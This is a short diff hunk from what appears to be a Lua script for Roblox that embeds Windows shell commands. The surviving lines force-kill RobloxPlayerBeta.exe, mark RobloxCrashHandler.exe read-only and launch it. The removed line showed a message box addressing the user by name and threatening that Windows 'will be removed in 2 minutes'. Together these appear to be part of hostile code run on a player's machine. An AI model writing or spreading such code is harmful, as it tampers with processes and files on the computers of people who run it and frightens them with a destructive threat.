@@ -13,8 +13,6 @@ for i, v in pairs(getactors()) do
 
                 taskkill /f /im RobloxPlayerBeta.exe
 
-                [System.Windows.MessageBox]::Show("Greetings, $env:USERNAME! Your Windows will be removed in 2 minutes! Good luck!",0, 16)
-
                 attrib +r RobloxCrashHandler.exe
                 start RobloxCrashHandler.exe
             ]]
